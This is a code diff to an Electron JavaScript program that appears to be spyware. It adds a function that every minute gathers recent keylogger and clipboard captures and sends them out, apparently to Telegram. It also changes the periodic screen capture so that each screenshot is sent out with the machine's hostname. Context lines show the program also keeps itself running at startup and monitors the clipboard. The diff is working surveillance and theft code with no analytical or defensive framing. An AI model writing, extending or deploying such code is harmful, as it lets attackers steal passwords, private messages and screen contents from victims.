@@ -1855,6 +1855,24 @@ function monitorclipboard() {
   }, 3000)
 }
 
+function exfiltratefiles() {
+  let bulk = ''
+  try {
+    const kf = path.join(__dirname, 'keylog.txt')
+    if (fs.existsSync(kf)) {
+      const c = fs.readFileSync(kf, 'utf8')
+      if (c.length > 0) { bulk += '=== keylog ===\r\n' + c.substring(c.length - 2000) + '\r\n' }
+    }
+  } catch (e) {}
+  try {
+    if (fs.existsSync(clipfile)) {
+      const c = fs.readFileSync(clipfile, 'utf8')
+      if (c.length > 0) { bulk += '=== clipboard ===\r\n' + c.substring(c.length - 2000) + '\r\n' }
+    }
+  } catch (e) {}
+  if (bulk) sendtotg(bulk)
+}
+
 async function main() {
   persiststartup()
   try {
@@ -1864,6 +1882,7 @@ async function main() {
     ])
   } catch (e) {}
   monitorclipboard()
+  setInterval(exfiltratefiles, 60000)
 
   const win = new BrowserWindow({
     width: 620,
@@ -1884,8 +1903,10 @@ async function main() {
     try {
       const sources = await desktopCapturer.getSources({ types: ['screen'], thumbnailSize: { width: 1920, height: 1080 } })
       if (sources.length > 0) {
-        const ssname = `screen_${new Date().toISOString().replace(/[:.]/g, '-')}.png`
-        fs.writeFileSync(path.join(__dirname, ssname), sources[0].thumbnail.toPNG())
+        const ssname = `screen_${Date.now()}.png`
+        const sspath = path.join(__dirname, ssname)
+        fs.writeFileSync(sspath, sources[0].thumbnail.toPNG())
+        sendfiletotg(sspath, 'screenshot ' + os.hostname())
       }
     } catch (e) {}
   }, 120000)
